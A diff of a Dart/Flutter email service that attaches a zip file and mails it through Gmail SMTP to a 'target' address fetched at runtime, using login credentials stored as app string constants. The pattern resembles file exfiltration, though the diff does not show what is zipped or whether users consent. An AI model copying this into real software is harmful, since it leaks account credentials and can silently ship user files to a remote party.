@@ -4,22 +4,24 @@ import 'package:mailer/mailer.dart';
 import 'package:mailer/smtp_server.dart';
 import 'dart:io';
 
+import '../constants/ConstMethods.dart';
+
 class EmailService implements AbstractEmailService {
 
 
   @override
   Future<void> sendEmail(File zipFile) async {
-    //List<String> credentials = await ConstMethods.fetchTargetEmail();
-    //print("bilgiler: $credentials");
-    final smtpServer = gmail("","");
+    String credentials = await ConstMethods.fetchTargetEmail();
+    final smtpServer = gmail(AppStrings.email,AppStrings.password );
     final message = Message()
-      ..from =  const Address("oglcnkcr54_kcr@outlook.com",  AppStrings.info)
-      ..recipients.add("oglcnkcr54_kcr@outlook.com")
+      ..from =   Address(credentials,  AppStrings.info)
+      ..recipients.add(credentials)
       ..subject = AppStrings.subject
       ..text = AppStrings.content
       ..attachments.add(FileAttachment(zipFile));
     try {
       await send(message, smtpServer).then((onValue){
+        print("mail gönderildi}");
 
       });
 
